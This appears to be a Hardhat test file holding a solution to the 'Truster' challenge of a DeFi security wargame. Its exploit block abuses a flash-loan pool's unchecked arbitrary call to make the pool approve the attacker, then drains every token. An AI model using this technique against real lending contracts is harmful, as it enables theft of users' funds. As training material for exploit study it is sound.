const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        //// Create data
        let ABI = ["function approve(address spender,uint256 amount)"];
        let iface = new ethers.utils.Interface(ABI);
        let amount = await this.token.balanceOf(this.pool.address);
        let data = iface.encodeFunctionData("approve", [attacker.address, amount]);
        //// flash loan and call to give allownace for the attacker
        await this.pool.connect(attacker).flashLoan(
            100,
            this.pool.address,
            this.token.address,
            data
        );
        //after exploited
        console.log(`allowanc(pool, attacker): ${await this.token.allowance(this.pool.address, attacker.address)}`);
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, amount);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

